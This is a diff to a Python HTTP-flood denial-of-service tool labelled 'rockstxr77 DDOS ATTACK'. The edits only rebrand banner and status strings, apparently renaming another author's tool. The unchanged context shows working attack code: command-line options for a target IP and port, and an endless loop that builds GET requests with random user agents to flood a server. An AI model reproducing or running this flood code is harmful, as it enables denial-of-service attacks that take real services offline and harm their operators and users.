@@ -1,3 +1,4 @@
+
 import socket
 import sys,os
 from optparse import OptionParser
@@ -46,7 +47,7 @@ def get_Typer():
 	global levels
 	global fake_ip
 	global hides
-	optp = OptionParser(add_help_option=False,epilog="rockstxr77 DDOS ATTACK")
+	optp = OptionParser(add_help_option=False,epilog="rockstxr77 DDos ATTACK")
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-i","--ip", dest="host",help="attack to server ip -i ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
@@ -120,7 +121,7 @@ def my_bots():
 
 #DDOS 1 + MASSEGS
 def attack(item):
-             with console.status("[bold dark_orange]Alixan is Attacking CTRL+Z .....") as status:
+             with console.status("[bold dark_orange] rockstxr77 is Attacking CTRL+Z .....") as status:
                  while True:
                      try:
                          packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
@@ -241,7 +242,7 @@ def dos_3():
 def usage():
     console = Console()
     MARKDOWN=("""
-         	     rockstxr77 DDOS ATTACK            """)
+         	     rockstxr77 DDos ATTACK            """)
     md = Markdown(MARKDOWN)
     console.print(md,style="bold green")   
     
